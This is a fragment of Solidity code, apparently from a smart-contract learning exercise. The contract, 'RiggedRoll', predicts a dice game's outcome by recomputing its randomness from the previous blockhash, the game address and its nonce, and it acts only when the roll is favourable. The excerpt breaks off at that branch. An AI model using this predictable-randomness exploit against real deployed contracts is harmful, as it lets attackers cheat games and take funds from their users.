...
contract RiggedRoll is Ownable {
    ...
    // uint256 public nonce = diceGame.nonce();
    address gameAddress;
    ...
    function riggedRoll() public payable{
        require(address(this).balance >= 0.002 ether, "Balance too low");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, gameAddress , diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        if(roll == 0) {
